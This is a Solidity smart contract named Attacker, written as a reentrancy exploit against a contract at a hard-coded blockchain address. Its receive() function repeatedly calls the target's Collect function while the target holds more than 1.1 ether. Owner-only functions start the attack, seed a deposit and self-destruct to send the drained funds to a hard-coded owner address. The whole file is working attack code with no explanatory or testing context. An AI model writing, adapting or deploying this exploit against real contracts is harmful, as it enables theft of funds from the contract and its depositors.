pragma solidity 0.8.0;

interface VulnerableContract {
    function Collect(uint _am) external;
}

contract Attacker
{
    address constant VULNERABLE_ADDRESS = address(0x084D3Fb3ED6bBeC95C305B546e6e01Dac23ba832);
    address constant OWNER_ADDRESS = address(0xed749FD214F96B7B8D6279E93a34e092b73F63a1);
    
    receive() external payable {
        if (msg.sender == VULNERABLE_ADDRESS && VULNERABLE_ADDRESS.balance >= 1100000000000000000) {
            VulnerableContract vc = VulnerableContract(VULNERABLE_ADDRESS);
            vc.Collect(1000000000000000000);
        }
    }
    
    function startCollecting() external {
        if (msg.sender == OWNER_ADDRESS) {
            VulnerableContract vc = VulnerableContract(VULNERABLE_ADDRESS);
            vc.Collect(1 ether);
        }
    }
    
    function put() external {
        if (msg.sender == OWNER_ADDRESS) {
            payable(VULNERABLE_ADDRESS).call{value: 1000000000000000000, gas: 400000}("");
        }
    }
    
    function kill() public {
        if (msg.sender == OWNER_ADDRESS) {
            selfdestruct(payable(OWNER_ADDRESS));
        }
    }
}
